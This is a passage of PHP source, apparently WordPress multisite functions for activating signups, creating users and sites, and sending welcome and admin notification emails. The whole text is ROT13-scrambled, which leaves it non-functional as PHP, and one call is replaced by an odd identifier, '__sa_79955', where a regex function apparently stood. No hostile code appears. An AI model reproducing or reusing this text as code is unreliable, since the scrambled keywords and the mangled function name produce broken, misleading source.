					'npgvingrq' => $abj,
				),
				neenl( 'npgvingvba_xrl' => $xrl )
			);
		}
		erghea $oybt_vq;
	}

	$jcqo->hcqngr(
		$jcqo->fvtahcf,
		neenl(
			'npgvir'    => 1,
			'npgvingrq' => $abj,
		),
		neenl( 'npgvingvba_xrl' => $xrl )
	);

	/**
	 * Sverf vzzrqvngryl nsgre n fvgr vf npgvingrq.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag    $oybt_vq       Oybt VQ.
	 * @cnenz vag    $hfre_vq       Hfre VQ.
	 * @cnenz fgevat $cnffjbeq      Hfre cnffjbeq.
	 * @cnenz fgevat $fvtahc_gvgyr  Fvgr gvgyr.
	 * @cnenz neenl  $zrgn          Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
	 */
	qb_npgvba( 'jczh_npgvingr_oybt', $oybt_vq, $hfre_vq, $cnffjbeq, $fvtahc->gvgyr, $zrgn );

	erghea neenl(
		'oybt_vq'  => $oybt_vq,
		'hfre_vq'  => $hfre_vq,
		'cnffjbeq' => $cnffjbeq,
		'gvgyr'    => $fvtahc->gvgyr,
		'zrgn'     => $zrgn,
	);
}

/**
 * Qryrgrf na nffbpvngrq fvtahc ragel jura n hfre vf qryrgrq sebz gur qngnonfr.
 *
 * @fvapr 5.5.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag      $vq       VQ bs gur hfre gb qryrgr.
 * @cnenz vag|ahyy $ernffvta VQ bs gur hfre gb ernffvta cbfgf naq yvaxf gb.
 * @cnenz JC_Hfre  $hfre     Hfre bowrpg.
 */
shapgvba jc_qryrgr_fvtahc_ba_hfre_qryrgr( $vq, $ernffvta, $hfre ) {
	tybony $jcqo;

	$jcqo->qryrgr( $jcqo->fvtahcf, neenl( 'hfre_ybtva' => $hfre->hfre_ybtva ) );
}

/**
 * Perngrf n hfre.
 *
 * Guvf shapgvba ehaf jura n hfre frys-ertvfgref nf jryy nf jura
 * n Fhcre Nqzva perngrf n arj hfre. Ubbx gb {@frr 'jczh_arj_hfre'} sbe riragf
 * gung fubhyq nssrpg nyy arj hfref, ohg bayl ba Zhygvfvgr (bgurejvfr
 * hfr {@frr 'hfre_ertvfgre'}).
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $hfre_anzr Gur arj hfre'f ybtva anzr.
 * @cnenz fgevat $cnffjbeq  Gur arj hfre'f cnffjbeq.
 * @cnenz fgevat $rznvy     Gur arj hfre'f rznvy nqqerff.
 * @erghea vag|snyfr Ergheaf snyfr ba snvyher, be vag $hfre_vq ba fhpprff.
 */
shapgvba jczh_perngr_hfre(
	$hfre_anzr,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq,
	$rznvy
) {
	$hfre_anzr = __sa_79955( '/\f+/', '', fnavgvmr_hfre( $hfre_anzr, gehr ) );

	$hfre_vq = jc_perngr_hfre( $hfre_anzr, $cnffjbeq, $rznvy );
	vs ( vf_jc_reebe( $hfre_vq ) ) {
		erghea snyfr;
	}

	// Arjyl perngrq hfref unir ab ebyrf be pncf hagvy gurl ner nqqrq gb n oybt.
	qryrgr_hfre_bcgvba( $hfre_vq, 'pncnovyvgvrf' );
	qryrgr_hfre_bcgvba( $hfre_vq, 'hfre_yriry' );

	/**
	 * Sverf vzzrqvngryl nsgre n arj hfre vf perngrq.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 */
	qb_npgvba( 'jczh_arj_hfre', $hfre_vq );

	erghea $hfre_vq;
}

/**
 * Perngrf n fvgr.
 *
 * Guvf shapgvba ehaf jura n hfre frys-ertvfgref n arj fvgr nf jryy
 * nf jura n Fhcre Nqzva perngrf n arj fvgr. Ubbx gb {@frr 'jczh_arj_oybt'}
 * sbe riragf gung fubhyq nssrpg nyy arj fvgrf.
 *
 * Ba fhoqverpgbel vafgnyyngvbaf, $qbznva vf gur fnzr nf gur znva fvgr'f
 * qbznva, naq gur cngu vf gur fhoqverpgbel anzr (rt 'rknzcyr.pbz'
 * naq '/oybt1/'). Ba fhoqbznva vafgnyyngvbaf, $qbznva vf gur arj fhoqbznva +
 * ebbg qbznva (rt 'oybt1.rknzcyr.pbz'), naq $cngu vf '/'.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $qbznva     Gur arj fvgr'f qbznva.
 * @cnenz fgevat $cngu       Gur arj fvgr'f cngu.
 * @cnenz fgevat $gvgyr      Gur arj fvgr'f gvgyr.
 * @cnenz vag    $hfre_vq    Gur hfre VQ bs gur arj fvgr'f nqzva.
 * @cnenz neenl  $bcgvbaf    Bcgvbany. Neenl bs xrl=>inyhr cnvef hfrq gb frg vavgvny fvgr bcgvbaf.
 *                           Vs inyvq fgnghf xrlf ner vapyhqrq ('choyvp', 'nepuvirq', 'zngher',
 *                           'fcnz', 'qryrgrq', be 'ynat_vq') gur tvira fvgr fgnghf(rf) jvyy or
 *                           hcqngrq. Bgurejvfr, xrlf naq inyhrf jvyy or hfrq gb frg bcgvbaf sbe
 *                           gur arj fvgr. Qrsnhyg rzcgl neenl.
 * @cnenz vag    $argjbex_vq Bcgvbany. Argjbex VQ. Bayl eryrinag ba zhygv-argjbex vafgnyyngvbaf.
 *                           Qrsnhyg 1.
 * @erghea vag|JC_Reebe Ergheaf JC_Reebe bowrpg ba snvyher, gur arj fvgr VQ ba fhpprff.
 */
shapgvba jczh_perngr_oybt( $qbznva, $cngu, $gvgyr, $hfre_vq, $bcgvbaf = neenl(), $argjbex_vq = 1 ) {
	$qrsnhygf = neenl(
		'choyvp' => 0,
	);
	$bcgvbaf  = jc_cnefr_netf( $bcgvbaf, $qrsnhygf );

	$gvgyr   = fgevc_gntf( $gvgyr );
	$hfre_vq = (vag) $hfre_vq;

	// Purpx vs gur qbznva unf orra hfrq nyernql. Jr fubhyq erghea na reebe zrffntr.
	vs ( qbznva_rkvfgf( $qbznva, $cngu, $argjbex_vq ) ) {
		erghea arj JC_Reebe( 'oybt_gnxra', __( 'Fbeel, gung fvgr nyernql rkvfgf!' ) );
	}

	vs ( ! jc_vafgnyyvat() ) {
		jc_vafgnyyvat( gehr );
	}

	$nyybjrq_qngn_svryqf = neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq', 'ynat_vq' );

	$fvgr_qngn = neenl_zretr(
		neenl(
			'qbznva'     => $qbznva,
			'cngu'       => $cngu,
			'argjbex_vq' => $argjbex_vq,
		),
		neenl_vagrefrpg_xrl( $bcgvbaf, neenl_syvc( $nyybjrq_qngn_svryqf ) )
	);

	// Qngn gb cnff gb jc_vavgvnyvmr_fvgr().
	$fvgr_vavgvnyvmngvba_qngn = neenl(
		'gvgyr'   => $gvgyr,
		'hfre_vq' => $hfre_vq,
		'bcgvbaf' => neenl_qvss_xrl( $bcgvbaf, neenl_syvc( $nyybjrq_qngn_svryqf ) ),
	);

	$oybt_vq = jc_vafreg_fvgr( neenl_zretr( $fvgr_qngn, $fvgr_vavgvnyvmngvba_qngn ) );

	vs ( vf_jc_reebe( $oybt_vq ) ) {
		erghea $oybt_vq;
	}

	jc_pnpur_frg_fvgrf_ynfg_punatrq();

	erghea $oybt_vq;
}

/**
 * Abgvsvrf gur argjbex nqzva gung n arj fvgr unf orra npgvingrq.
 *
 * Svygre {@frr 'arjoybt_abgvsl_fvgrnqzva'} gb punatr gur pbagrag bs
 * gur abgvsvpngvba rznvy.
 *
 * @fvapr ZH (3.0.0)
 * @fvapr 5.1.0 $oybt_vq abj fhccbegf vachg sebz gur {@frr 'jc_vavgvnyvmr_fvgr'} npgvba.
 *
 * @cnenz JC_Fvgr|vag $oybt_vq    Gur arj fvgr'f bowrpg be VQ.
 * @cnenz fgevat      $qrcerpngrq Abg hfrq.
 * @erghea obby
 */
shapgvba arjoybt_abgvsl_fvgrnqzva( $oybt_vq, $qrcerpngrq = '' ) {
	vs ( vf_bowrpg( $oybt_vq ) ) {
		$oybt_vq = $oybt_vq->oybt_vq;
	}

	vs ( 'lrf' !== trg_fvgr_bcgvba( 'ertvfgengvbaabgvsvpngvba' ) ) {
		erghea snyfr;
	}

	$rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( ! vf_rznvy( $rznvy ) ) {
		erghea snyfr;
	}

	$bcgvbaf_fvgr_hey = rfp_hey( argjbex_nqzva_hey( 'frggvatf.cuc' ) );

	fjvgpu_gb_oybt( $oybt_vq );
	$oybtanzr = trg_bcgvba( 'oybtanzr' );
	$fvgrhey  = fvgr_hey();
	erfgber_pheerag_oybt();

	$zft = fcevags(
		/* genafyngbef: Arj fvgr abgvsvpngvba rznvy. 1: Fvgr HEY, 2: Hfre VC nqqerff, 3: HEY gb Argjbex Frggvatf fperra. */
		__(
			'Arj Fvgr: %1$f
HEY: %2$f
Erzbgr VC nqqerff: %3$f

Qvfnoyr gurfr abgvsvpngvbaf: %4$f'
		),
		$oybtanzr,
		$fvgrhey,
		jc_hafynfu( $_FREIRE['ERZBGR_NQQE'] ),
		$bcgvbaf_fvgr_hey
	);
	/**
	 * Svygref gur zrffntr obql bs gur arj fvgr npgvingvba rznvy frag
	 * gb gur argjbex nqzvavfgengbe.
	 *
	 * @fvapr ZH (3.0.0)
	 * @fvapr 5.4.0 Gur `$oybt_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat     $zft     Rznvy obql.
	 * @cnenz vag|fgevat $oybt_vq Gur arj fvgr'f VQ nf na vagrtre be ahzrevp fgevat.
	 */
	$zft = nccyl_svygref( 'arjoybt_abgvsl_fvgrnqzva', $zft, $oybt_vq );

	/* genafyngbef: Arj fvgr abgvsvpngvba rznvy fhowrpg. %f: Arj fvgr HEY. */
	jc_znvy( $rznvy, fcevags( __( 'Arj Fvgr Ertvfgengvba: %f' ), $fvgrhey ), $zft );

	erghea gehr;
}

/**
 * Abgvsvrf gur argjbex nqzva gung n arj hfre unf orra npgvingrq.
 *
 * Svygre {@frr 'arjhfre_abgvsl_fvgrnqzva'} gb punatr gur pbagrag bs
 * gur abgvsvpngvba rznvy.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $hfre_vq Gur arj hfre'f VQ.
 * @erghea obby
 */
shapgvba arjhfre_abgvsl_fvgrnqzva( $hfre_vq ) {
	vs ( 'lrf' !== trg_fvgr_bcgvba( 'ertvfgengvbaabgvsvpngvba' ) ) {
		erghea snyfr;
	}

	$rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( ! vf_rznvy( $rznvy ) ) {
		erghea snyfr;
	}

	$hfre = trg_hfreqngn( $hfre_vq );

	$bcgvbaf_fvgr_hey = rfp_hey( argjbex_nqzva_hey( 'frggvatf.cuc' ) );

	$zft = fcevags(
		/* genafyngbef: Arj hfre abgvsvpngvba rznvy. 1: Hfre ybtva, 2: Hfre VC nqqerff, 3: HEY gb Argjbex Frggvatf fperra. */
		__(
			'Arj Hfre: %1$f
Erzbgr VC nqqerff: %2$f

Qvfnoyr gurfr abgvsvpngvbaf: %3$f'
		),
		$hfre->hfre_ybtva,
		jc_hafynfu( $_FREIRE['ERZBGR_NQQE'] ),
		$bcgvbaf_fvgr_hey
	);

	/**
	 * Svygref gur zrffntr obql bs gur arj hfre npgvingvba rznvy frag
	 * gb gur argjbex nqzvavfgengbe.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat  $zft  Rznvy obql.
	 * @cnenz JC_Hfre $hfre JC_Hfre vafgnapr bs gur arj hfre.
	 */
	$zft = nccyl_svygref( 'arjhfre_abgvsl_fvgrnqzva', $zft, $hfre );

	/* genafyngbef: Arj hfre abgvsvpngvba rznvy fhowrpg. %f: Hfre ybtva. */
	jc_znvy( $rznvy, fcevags( __( 'Arj Hfre Ertvfgengvba: %f' ), $hfre->hfre_ybtva ), $zft );

	erghea gehr;
}

/**
 * Purpxf jurgure n fvgr anzr vf nyernql gnxra.
 *
 * Gur anzr vf gur fvgr'f fhoqbznva be gur fvgr'f fhoqverpgbel
 * cngu qrcraqvat ba gur argjbex frggvatf.
 *
 * Hfrq qhevat gur arj fvgr ertvfgengvba cebprff gb rafher
 * gung rnpu fvgr anzr vf havdhr.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $qbznva     Gur qbznva gb or purpxrq.
 * @cnenz fgevat $cngu       Gur cngu gb or purpxrq.
 * @cnenz vag    $argjbex_vq Bcgvbany. Argjbex VQ. Bayl eryrinag ba zhygv-argjbex vafgnyyngvbaf.
 *                           Qrsnhyg 1.
 * @erghea vag|ahyy Gur fvgr VQ vs gur fvgr anzr rkvfgf, ahyy bgurejvfr.
 */
shapgvba qbznva_rkvfgf( $qbznva, $cngu, $argjbex_vq = 1 ) {
	$cngu   = genvyvatfynfuvg( $cngu );
	$netf   = neenl(
		'argjbex_vq'             => $argjbex_vq,
		'qbznva'                 => $qbznva,
		'cngu'                   => $cngu,
		'svryqf'                 => 'vqf',
		'ahzore'                 => 1,
		'hcqngr_fvgr_zrgn_pnpur' => snyfr,
	);
	$erfhyg = trg_fvgrf( $netf );
	$erfhyg = neenl_fuvsg( $erfhyg );

	/**
	 * Svygref jurgure n fvgr anzr vf gnxra.
	 *
	 * Gur anzr vf gur fvgr'f fhoqbznva be gur fvgr'f fhoqverpgbel
	 * cngu qrcraqvat ba gur argjbex frggvatf.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag|ahyy $erfhyg     Gur fvgr VQ vs gur fvgr anzr rkvfgf, ahyy bgurejvfr.
	 * @cnenz fgevat   $qbznva     Qbznva gb or purpxrq.
	 * @cnenz fgevat   $cngu       Cngu gb or purpxrq.
	 * @cnenz vag      $argjbex_vq Argjbex VQ. Bayl eryrinag ba zhygv-argjbex vafgnyyngvbaf.
	 */
	erghea nccyl_svygref( 'qbznva_rkvfgf', $erfhyg, $qbznva, $cngu, $argjbex_vq );
}

/**
 * Abgvsvrf gur fvgr nqzvavfgengbe gung gurve fvgr npgvingvba jnf fhpprffshy.
 *
 * Svygre {@frr 'jczh_jrypbzr_abgvsvpngvba'} gb qvfnoyr be olcnff.
 *
 * Svygre {@frr 'hcqngr_jrypbzr_rznvy'} naq {@frr 'hcqngr_jrypbzr_fhowrpg'} gb
 * zbqvsl gur pbagrag naq fhowrpg yvar bs gur abgvsvpngvba rznvy.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $oybt_vq  Fvgr VQ.
 * @cnenz vag    $hfre_vq  Hfre VQ.
 * @cnenz fgevat $cnffjbeq Hfre cnffjbeq, be \"A/N\" vs gur hfre nppbhag vf abg arj.
 * @cnenz fgevat $gvgyr    Fvgr gvgyr.
 * @cnenz neenl  $zrgn     Bcgvbany. Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
 * @erghea obby Jurgure gur rznvy abgvsvpngvba jnf frag.
 */
shapgvba jczh_jrypbzr_abgvsvpngvba(
	$oybt_vq,
	$hfre_vq,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq,
	$gvgyr,
	$zrgn = neenl()
) {
	$pheerag_argjbex = trg_argjbex();

	/**
	 * Svygref jurgure gb olcnff gur jrypbzr rznvy frag gb gur fvgr nqzvavfgengbe nsgre fvgr npgvingvba.
	 *
	 * Ergheavat snyfr qvfnoyrf gur jrypbzr rznvy.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag|snyfr $oybt_vq  Fvgr VQ, be snyfr gb cerirag gur rznvy sebz fraqvat.
	 * @cnenz vag       $hfre_vq  Hfre VQ bs gur fvgr nqzvavfgengbe.
	 * @cnenz fgevat    $cnffjbeq Hfre cnffjbeq, be \"A/N\" vs gur hfre nppbhag vf abg arj.
	 * @cnenz fgevat    $gvgyr    Fvgr gvgyr.
	 * @cnenz neenl     $zrgn     Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
	 */
	vs ( ! nccyl_svygref( 'jczh_jrypbzr_abgvsvpngvba', $oybt_vq, $hfre_vq, $cnffjbeq, $gvgyr, $zrgn ) ) {
		erghea snyfr;
	}

	$hfre = trg_hfreqngn( $hfre_vq );

	$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $hfre_vq );

	$jrypbzr_rznvy = trg_fvgr_bcgvba( 'jrypbzr_rznvy' );

	vs ( ! $jrypbzr_rznvy ) {
		/* genafyngbef: Qb abg genafyngr HFREANZR, FVGR_ANZR, OYBT_HEY, CNFFJBEQ: gubfr ner cynprubyqref. */
		$jrypbzr_rznvy = __(
			'Ubjql HFREANZR,

Lbhe arj FVGR_ANZR fvgr unf orra fhpprffshyyl frg hc ng:
OYBT_HEY

Lbh pna ybt va gb gur nqzvavfgengbe nppbhag jvgu gur sbyybjvat vasbezngvba:

Hfreanzr: HFREANZR
Cnffjbeq: CNFFJBEQ
Ybt va urer: OYBT_HEYjc-ybtva.cuc

Jr ubcr lbh rawbl lbhe arj fvgr. Gunaxf!

--Gur Grnz @ FVGR_ANZR'
		);
	}

	$hey = trg_oybtnqqerff_ol_vq( $oybt_vq );

	$jrypbzr_rznvy = fge_ercynpr( 'FVGR_ANZR', $pheerag_argjbex->fvgr_anzr, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'OYBT_GVGYR', $gvgyr, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'OYBT_HEY', $hey, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'HFREANZR', $hfre->hfre_ybtva, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'CNFFJBEQ', $cnffjbeq, $jrypbzr_rznvy );

	/**
	 * Svygref gur pbagrag bs gur jrypbzr rznvy frag gb gur fvgr nqzvavfgengbe nsgre fvgr npgvingvba.
	 *
	 * Pbagrag fubhyq or sbeznggrq sbe genafzvffvba ivn jc_znvy().
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $jrypbzr_rznvy Zrffntr obql bs gur rznvy.
	 * @cnenz vag    $oybt_vq       Fvgr VQ.
	 * @cnenz vag    $hfre_vq       Hfre VQ bs gur fvgr nqzvavfgengbe.
	 * @cnenz fgevat $cnffjbeq      Hfre cnffjbeq, be \"A/N\" vs gur hfre nppbhag vf abg arj.
	 * @cnenz fgevat $gvgyr         Fvgr gvgyr.
	 * @cnenz neenl  $zrgn          Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
	 */
	$jrypbzr_rznvy = nccyl_svygref( 'hcqngr_jrypbzr_rznvy', $jrypbzr_rznvy, $oybt_vq, $hfre_vq, $cnffjbeq, $gvgyr, $zrgn );

	$nqzva_rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( '' === $nqzva_rznvy ) {
		$nqzva_rznvy = 'fhccbeg@' . jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG );
	}

	$sebz_anzr       = ( '' !== trg_fvgr_bcgvba( 'fvgr_anzr' ) ) ? rfp_ugzy( trg_fvgr_bcgvba( 'fvgr_anzr' ) ) : 'JbeqCerff';
	$zrffntr_urnqref = \"Sebz: \\"{$sebz_anzr}\\" <{$nqzva_rznvy}>\a\" . 'Pbagrag-Glcr: grkg/cynva; punefrg=\"' . trg_bcgvba( 'oybt_punefrg' ) . \"\\"\a\";
	$zrffntr         = $jrypbzr_rznvy;

	vs ( rzcgl( $pheerag_argjbex->fvgr_anzr ) ) {
		$pheerag_argjbex->fvgr_anzr = 'JbeqCerff';
	}

	/* genafyngbef: Arj fvgr abgvsvpngvba rznvy fhowrpg. 1: Argjbex gvgyr, 2: Arj fvgr gvgyr. */
	$fhowrpg = __( 'Arj %1$f Fvgr: %2$f' );

	/**
	 * Svygref gur fhowrpg bs gur jrypbzr rznvy frag gb gur fvgr nqzvavfgengbe nsgre fvgr npgvingvba.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $fhowrpg Fhowrpg bs gur rznvy.
	 */
	$fhowrpg = nccyl_svygref( 'hcqngr_jrypbzr_fhowrpg', fcevags( $fhowrpg, $pheerag_argjbex->fvgr_anzr, jc_hafynfu( $gvgyr ) ) );

	jc_znvy( $hfre->hfre_rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $zrffntr, $zrffntr_urnqref );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	erghea gehr;
}

/**
 * Abgvsvrf gur Zhygvfvgr argjbex nqzvavfgengbe gung n arj fvgr jnf perngrq.
 *
 * Svygre {@frr 'fraq_arj_fvgr_rznvy'} gb qvfnoyr be olcnff.
 *
 * Svygre {@frr 'arj_fvgr_rznvy'} gb svygre gur pbagragf.
 *
 * @fvapr 5.6.0
 *
 * @cnenz vag $fvgr_vq Fvgr VQ bs gur arj fvgr.
 * @cnenz vag $hfre_vq Hfre VQ bs gur nqzvavfgengbe bs gur arj fvgr.
 * @erghea obby Jurgure gur rznvy abgvsvpngvba jnf frag.
 */
shapgvba jczh_arj_fvgr_nqzva_abgvsvpngvba( $fvgr_vq, $hfre_vq ) {
	$fvgr  = trg_fvgr( $fvgr_vq );
	$hfre  = trg_hfreqngn( $hfre_vq );
	$rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( ! $fvgr || ! $hfre || ! $rznvy ) {
		erghea snyfr;
	}

	/**
	 * Svygref jurgure gb fraq na rznvy gb gur Zhygvfvgr argjbex nqzvavfgengbe jura n arj fvgr vf perngrq.
	 *
	 * Erghea snyfr gb qvfnoyr fraqvat gur rznvy.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz obby    $fraq Jurgure gb fraq gur rznvy.
	 * @cnenz JC_Fvgr $fvgr Fvgr bowrpg bs gur arj fvgr.
	 * @cnenz JC_Hfre $hfre Hfre bowrpg bs gur nqzvavfgengbe bs gur arj fvgr.
	 */
	vs ( ! nccyl_svygref( 'fraq_arj_fvgr_rznvy', gehr, $fvgr, $hfre ) ) {
		erghea snyfr;
	}

	$fjvgpurq_ybpnyr = snyfr;
	$argjbex_nqzva   = trg_hfre_ol( 'rznvy', $rznvy );

	vs ( $argjbex_nqzva ) {
		// Vs gur argjbex nqzva rznvy nqqerff pbeerfcbaqf gb n hfre, fjvgpu gb gurve ybpnyr.
		$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $argjbex_nqzva->VQ );
	} ryfr {
		// Bgurejvfr fjvgpu gb gur ybpnyr bs gur pheerag fvgr.
		$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
	}

	$fhowrpg = fcevags(
		/* genafyngbef: Arj fvgr abgvsvpngvba rznvy fhowrpg. %f: Argjbex gvgyr. */
		__( '[%f] Arj Fvgr Perngrq' ),
		trg_argjbex()->fvgr_anzr
	);

	$zrffntr = fcevags(
		/* genafyngbef: Arj fvgr abgvsvpngvba rznvy. 1: Hfre ybtva, 2: Fvgr HEY, 3: Fvgr gvgyr. */
		__(
			'Arj fvgr perngrq ol %1$f

Nqqerff: %2$f
Anzr: %3$f'
		),
		$hfre->hfre_ybtva,
		trg_fvgr_hey( $fvgr->vq ),
		trg_oybt_bcgvba( $fvgr->vq, 'oybtanzr' )
	);

	$urnqre = fcevags(
		'Sebz: \"%1$f\" <%2$f>',
		_k( 'Fvgr Nqzva', 'rznvy \"Sebz\" svryq' ),
		$rznvy
	);

	$arj_fvgr_rznvy = neenl(
		'gb'      => $rznvy,
		'fhowrpg' => $fhowrpg,
		'zrffntr' => $zrffntr,
		'urnqref' => $urnqre,
	);

	/**
	 * Svygref gur pbagrag bs gur rznvy frag gb gur Zhygvfvgr argjbex nqzvavfgengbe jura n arj fvgr vf perngrq.
	 *
	 * Pbagrag fubhyq or sbeznggrq sbe genafzvffvba ivn jc_znvy().
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $arj_fvgr_rznvy {
	 *     Hfrq gb ohvyq jc_znvy().
	 *
	 *     @glcr fgevat $gb      Gur rznvy nqqerff bs gur erpvcvrag.
	 *     @glcr fgevat $fhowrpg Gur fhowrpg bs gur rznvy.
	 *     @glcr fgevat $zrffntr Gur pbagrag bs gur rznvy.
	 *     @glcr fgevat $urnqref Urnqref.
	 * }
	 * @cnenz JC_Fvgr $fvgr         Fvgr bowrpg bs gur arj fvgr.
	 * @cnenz JC_Hfre $hfre         Hfre bowrpg bs gur nqzvavfgengbe bs gur arj fvgr.
	 */
	$arj_fvgr_rznvy = nccyl_svygref( 'arj_fvgr_rznvy', $arj_fvgr_rznvy, $fvgr, $hfre );

	jc_znvy(
		$arj_fvgr_rznvy['gb'],
		jc_fcrpvnypunef_qrpbqr( $arj_fvgr_rznvy['fhowrpg'] ),
		$arj_fvgr_rznvy['zrffntr'],
		$arj_fvgr_rznvy['urnqref']
	);

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	erghea gehr;
}

/**
 * Abgvsvrf n hfre gung gurve nppbhag npgvingvba unf orra fhpprffshy.
 *
 * Svygre {@frr 'jczh_jrypbzr_hfre_abgvsvpngvba'} gb qvfnoyr be olcnff.
 *
 * Svygre {@frr 'hcqngr_jrypbzr_hfre_rznvy'} naq {@frr 'hcqngr_jrypbzr_hfre_fhowrpg'} gb
 * zbqvsl gur pbagrag naq fhowrpg yvar bs gur abgvsvpngvba rznvy.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $hfre_vq  Hfre VQ.
 * @cnenz fgevat $cnffjbeq Hfre cnffjbeq.
 * @cnenz neenl  $zrgn     Bcgvbany. Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
 * @erghea obby
 */
shapgvba jczh_jrypbzr_hfre_abgvsvpngvba(
	$hfre_vq,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq,
	$zrgn = neenl()
) {
	$pheerag_argjbex = trg_argjbex();

	/**
	 * Svygref jurgure gb olcnff gur jrypbzr rznvy nsgre hfre npgvingvba.
	 *
	 * Ergheavat snyfr qvfnoyrf gur jrypbzr rznvy.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag    $hfre_vq  Hfre VQ.
	 * @cnenz fgevat $cnffjbeq Hfre cnffjbeq.
	 * @cnenz neenl  $zrgn     Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 */
	vs ( ! nccyl_svygref( 'jczh_jrypbzr_hfre_abgvsvpngvba', $hfre_vq, $cnffjbeq, $zrgn ) ) {
		erghea snyfr;
	}

	$jrypbzr_rznvy = trg_fvgr_bcgvba( 'jrypbzr_hfre_rznvy' );

	$hfre = trg_hfreqngn( $hfre_vq );

	$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $hfre_vq );

	/**
	 * Svygref gur pbagrag bs gur jrypbzr rznvy nsgre hfre npgvingvba.
	 *
	 * Pbagrag fubhyq or sbeznggrq sbe genafzvffvba ivn jc_znvy().
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $jrypbzr_rznvy Gur zrffntr obql bs gur nppbhag npgvingvba fhpprff rznvy.
	 * @cnenz vag    $hfre_vq       Hfre VQ.
	 * @cnenz fgevat $cnffjbeq      Hfre cnffjbeq.
	 * @cnenz neenl  $zrgn          Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 */
	$jrypbzr_rznvy = nccyl_svygref( 'hcqngr_jrypbzr_hfre_rznvy', $jrypbzr_rznvy, $hfre_vq, $cnffjbeq, $zrgn );
	$jrypbzr_rznvy = fge_ercynpr( 'FVGR_ANZR', $pheerag_argjbex->fvgr_anzr, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'HFREANZR', $hfre->hfre_ybtva, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'CNFFJBEQ', $cnffjbeq, $jrypbzr_rznvy );
	$jrypbzr_rznvy = fge_ercynpr( 'YBTVAYVAX', jc_ybtva_hey(), $jrypbzr_rznvy );

	$nqzva_rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( '' === $nqzva_rznvy ) {
		$nqzva_rznvy = 'fhccbeg@' . jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG );
	}

	$sebz_anzr       = ( '' !== trg_fvgr_bcgvba( 'fvgr_anzr' ) ) ? rfp_ugzy( trg_fvgr_bcgvba( 'fvgr_anzr' ) ) : 'JbeqCerff';
	$zrffntr_urnqref = \"Sebz: \\"{$sebz_anzr}\\" <{$nqzva_rznvy}>\a\" . 'Pbagrag-Glcr: grkg/cynva; punefrg=\"' . trg_bcgvba( 'oybt_punefrg' ) . \"\\"\a\";
	$zrffntr         = $jrypbzr_rznvy;

	vs ( rzcgl( $pheerag_argjbex->fvgr_anzr ) ) {
		$pheerag_argjbex->fvgr_anzr = 'JbeqCerff';
	}

	/* genafyngbef: Arj hfre abgvsvpngvba rznvy fhowrpg. 1: Argjbex gvgyr, 2: Arj hfre ybtva. */
	$fhowrpg = __( 'Arj %1$f Hfre: %2$f' );

	/**
	 * Svygref gur fhowrpg bs gur jrypbzr rznvy nsgre hfre npgvingvba.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $fhowrpg Fhowrpg bs gur rznvy.
	 */
